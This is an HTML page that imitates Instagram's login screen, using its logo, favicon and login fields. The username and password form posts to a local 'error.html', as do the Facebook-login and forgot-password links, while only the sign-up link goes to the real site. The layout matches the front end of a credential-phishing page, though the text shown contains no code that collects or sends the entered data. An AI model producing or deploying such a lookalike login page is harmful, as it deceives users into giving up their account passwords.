<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="stylesheet" href="style.css">
    <link rel="shortcut icon" href="res/instagram-new.png">
</head>

<body>
    <div class="container">
        <div class="login-box">
            <img src="res/instagram-logo.png" class="logo" alt="Instagram Logo">
            
            <form action="error.html" method="post">
                <input type="text" name="username" placeholder="Phone number, username, or email" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">Log In</button>
            </form>
            
            <div class="separator">
                <div class="line"></div>
                <p>OR</p>
                <div class="line"></div>
            </div>
            
            <div class="facebook-login">
                <img src="res/facebook.png" class="fb-icon" alt="Facebook Logo">
                <a href="error.html">Log in with Facebook</a>
            </div>
            
            <a href="error.html" class="forgot-password">Forgot password?</a>
        </div>
        
        <div class="signup-box">
            <p>Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a></p>
        </div>
    </div>
</body>

</html>
